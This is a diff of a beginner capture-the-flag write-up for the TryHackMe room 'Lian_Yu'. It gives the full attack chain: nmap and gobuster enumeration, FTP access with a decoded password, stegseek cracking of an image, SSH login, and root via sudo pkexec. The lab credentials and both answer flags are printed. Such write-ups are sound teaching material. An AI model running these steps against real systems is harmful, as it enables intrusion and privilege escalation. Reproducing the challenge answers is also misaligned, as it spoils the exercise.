@@ -1,126 +1,245 @@
-# 🏹 Lian_Yu Writeup
+# Lian_Yu Writeup
 
-**Level:** Beginner  
-**Platform:** TryHackMe  
-
----
-
-## 📌 Overview
-
-This room involves enumeration, directory discovery, FTP access, steganography, and privilege escalation to capture user and root flags.
+> A beginner level security challenge.
 
 ---
 
 ## 🔍 Task 1: Web Directory
 
-**Question:** What is the Web Directory you found?
+### Question
+What is the Web Directory you found?
 
-### Approach:
+### Steps
 
-- Performed an Nmap scan:
-  - Open ports: `21 (FTP)`, `22 (SSH)`, `80 (HTTP)`, `111`
-- Accessed the web server on port 80
-- Used Gobuster for directory brute-forcing
-- Found directory: `/island`
+- Scanned the target using Nmap:
+```bash
+nmap -sC -sV <IP>
+```
 
-### Findings:
+- Open ports found:
+  - 21 (FTP)
+  - 22 (SSH)
+  - 80 (HTTP)
+  - 111 (RPC)
 
-- Viewing page source revealed FTP username: `vigilante`
-- Continued enumeration and found another directory: `/2100`
-- Found a file with `.ticket` extension
+- Opened the website on port 80  
+- Used Gobuster for directory enumeration:
+```bash
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t 150
+```
 
-### ✅ Answer: 2100
+- Found directory:
+```
+/island
+```
+
+- Checked source code → Found FTP username:
+```
+vigilante
+```
+
+- Increased threads for faster scanning (`-t 200`)  
+- Found another directory:
+```
+/2100
+```
+
+- Used curl to inspect:
+```bash
+curl http://<IP>/2100
+```
+
+- Found file with `.ticket` extension  
+
+### Answer
+```
+2100
+```
 
 ---
 
-## 🔍 Task 2: File Name
+## 🔍 Task 2: File Name Found
 
-**Question:** What is the file name you found?
+### Question
+What is the file name you found?
 
-### Approach:
+### Steps
 
-- Used Gobuster with extension flag:-x ticket
-- Discovered file:
+- Used Gobuster with extension:
+```bash
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x ticket
+```
 
-### ✅ Answer: green_arrow.ticket
+- Found file:
+```
+green_arrow.ticket
+```
 
+- Used curl:
+```bash
+curl http://<IP>/2100/green_arrow.ticket
+```
+
+- Found encoded string → decoded to get FTP password  
+
+### Answer
+```
+green_arrow.ticket
+```
 
 ---
 
 ## 🔍 Task 3: FTP Password
 
-**Question:** What is the FTP password?
+### Question
+What is the FTP password?
 
-### Approach:
+### Steps
 
-- Retrieved file content using curl
-- Found encoded string: RTy8yhBQdscX
+- Encoded string found:
+```
+RTy8yhBQdscX
+```
 
-- Decoded (Base58/Base57-like encoding)
+- Decoded → password:
 
-
-
-### ✅ Answer: !#th3h00d 
+### Answer
+```
+!#th3h00d
+```
 
 ---
 
 ## 🔍 Task 4: SSH Password File
 
-**Question:** What is the file name with SSH password?
+### Question
+What is the file name with SSH password?
 
-### Approach:
+### Steps
 
 - Logged into FTP:
-    - Username: vigilante
-    - Password: !#th3h00d
+```bash
+ftp <IP>
+```
 
-- Navigated directories and found another user: `slade`
-- Downloaded all files:
-``` mget .* * ```
+Credentials:
+```
+vigilante:!#th3h00d
+```
 
-- Identified `aa.jpg` as a steganographic file
-- Used `stegseek` with `rockyou.txt`:
-- Extracted: `aa.jpg.out`
+- Navigated directories:
+```bash
+cd ..
+ls
+```
 
-### Extracted Files:
-- `password.txt`
-- `shado`
+- Found user:
+```
+slade
+```
 
-- Found SSH password inside `shado`
+- Downloaded files:
+```bash
+mget .* *
+```
 
-### ✅ Answer:shado
+- Found image:
+```
+aa.jpg
+```
+
+- Used Stegseek:
+```bash
+stegseek aa.jpg /usr/share/wordlists/rockyou.txt
+```
+
+- Extracted zip:
+```
+aa.jpg.out
+```
+
+- Unzipped:
+```bash
+unzip aa.jpg.out
+```
+
+- Found files:
+```
+password.txt
+shado
+```
+
+- Found SSH password inside `shado`:
+```
+M3tahuman
+```
+
+### Answer
+```
+shado
+```
 
 ---
 
 ## 🔍 Task 5: User Flag
 
-**Question:** user.txt ?
+### Question
+user.txt ?
 
-### Approach:
+### Steps
 
 - SSH login:
-    - Username: slade
-    - Password: M3tahuman
-    
-- Located and read `user.txt`
+```bash
+ssh slade@<IP>
+```
 
-### ✅ Answer:  THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+Credentials:
+```
+M3tahuman
+```
 
+- Read flag:
+```bash
+cat user.txt
+```
+
+### Answer
+```
+THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+```
 
 ---
 
 ## 🔍 Task 6: Root Flag
 
-**Question:** root.txt ?
+### Question
+root.txt ?
 
-### Approach:
+### Steps
 
-- Checked sudo permissions:     
-    - sudo -l
-- Found permission to run:
-    - /usr/bin/pkexec
-- Escalated privileges:
-    - sudo /usr/bin/pkexec /bin/sh
-- Accessed root and read `root.txt`
+- Check sudo permissions:
+```bash
+sudo -l
+```
 
-### ✅ Answer:THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
+- Found:
+```
+/usr/bin/pkexec
+```
+
+- Escalate privileges:
+```bash
+sudo /usr/bin/pkexec /bin/sh
+```
+
+- Read root flag:
+```bash
+cat /root/root.txt
+```
+
+### Answer
+```
+THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
+```
+
+Report prepared by:  **zer0arc4**
